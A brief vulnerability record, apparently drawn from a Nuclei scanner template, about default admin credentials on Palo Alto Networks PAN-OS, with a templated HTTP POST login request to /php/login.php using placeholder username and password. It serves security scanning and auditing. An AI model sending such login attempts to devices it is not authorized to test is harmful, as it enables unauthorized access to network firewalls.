# Vulnerability: Palo Alto Networks PAN-OS Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`panos-default-login.yaml`)

## Description
Palo Alto Networks PAN-OS application default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /php/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&passwd={{password}}&challengePwd=&ok=Login
```

